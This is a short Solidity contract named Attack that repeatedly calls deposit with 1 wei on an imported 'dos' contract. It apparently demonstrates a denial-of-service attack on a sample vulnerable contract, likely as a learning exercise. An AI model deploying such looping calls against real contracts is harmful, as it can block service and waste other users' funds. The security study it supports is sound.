// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0 <0.9.0;

import "./dos.sol";

contract Attack{
    dos public Dos;

    constructor(dos _address){
        Dos = _address;
    }

    function sendether() public payable {

    }

    function attack() public {
        uint counter;
        while(counter<10){//problem occurs when counter<1000 which makes transaction goes in pending state and makes our transaction slow
        Dos.deposit{value:1 wei}();
        counter++;
        }
    }
}
